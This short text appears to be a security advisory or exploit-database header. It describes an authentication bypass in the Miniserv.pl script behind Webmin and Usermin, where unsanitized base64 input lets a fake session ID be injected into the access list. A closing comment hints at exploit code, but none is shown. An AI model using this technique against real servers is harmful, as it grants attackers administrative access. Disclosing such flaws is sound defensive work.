A vulnerability has been discovered in the 'Miniserv.pl' script used to invoke both Webmin and Usermin. Due to insufficient sanitization of client-supplied BASE64 encoded input, it is possible to inject a Session ID into the access control list.

Successful exploitation of this vulnerability may allow an attacker to bypass typical authentication procedures, thus gaining adminstrative access to a webmin/usermin interface.

# Inserts a fake session_id into the sessions list of webmin.
